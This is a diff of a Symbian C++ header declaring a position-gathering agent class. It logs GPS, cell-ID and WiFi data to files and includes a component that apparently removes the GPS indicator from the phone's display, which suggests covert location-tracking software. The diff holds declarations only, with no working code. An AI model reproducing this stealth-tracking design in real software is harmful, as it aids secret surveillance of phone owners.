@@ -1,7 +1,7 @@
 /*
  ============================================================================
  Name		: AgentPosition.h
- Author	  : Marco Bellino
+ Author	  : Jo'
  Version	 : 1.0
  Copyright   : Your copyright notice
  Description : CAgentPosition declaration
@@ -62,7 +62,6 @@ private:
     virtual void TimerExpiredL(TAny* src);
 
     // From MPositionerObserver
-	//virtual void HandleGPSPositionL(TPosition position);  //original MB
 	virtual void HandleGPSPositionL(TPositionSatelliteInfo position);
 	virtual void HandleGPSErrorL(TInt error);
 	
@@ -76,7 +75,6 @@ private:
 	 * Parse the GPS information and gets them as a buffer.
 	 * @return The buffer in proper format, ready to be written in the file.
 	 */
-	//HBufC8* GetGPSBufferL(TPosition pos);  // original MB
 	HBufC8* GetGPSBufferL(TPositionSatelliteInfo pos);
 	
 	/**
@@ -102,23 +100,24 @@ private:
 
 private:
 	CTimeOutTimer* iTimer;
-	TBool iCaptureGPS;
+	TBool iCaptureGps;
 	TBool iCaptureCellId;
 	TBool iCaptureWiFi;
-	TBool iPollGPS;
 	
 	TBool iAvailableWiFiModule;
 	
-	TBool iStopped;  //this is used internally to know if we have been stopped or not, please before modifying or relying on this, take care of similar state variable into AbstractQueueEndPoint::iCanReceive
-	
 	CPhone* iPhone;
 	CGPSPosition* iGPS;
-	TTimeIntervalSeconds iSecondsInterv;
+	//TTimeIntervalSeconds iSecondsInterv;
 	
 	CLogFile*	iLogCell;
 	CLogFile*	iLogGps;
 	
 	CGpsIndicatorRemover* iGpsIndicatorRemover;
+	
+	TBool iBusyWiFi;
+	TBool iBusyCellId;
+	TBool iBusyGps;
 	
 	__FLOG_DECLARATION_MEMBER
 	};
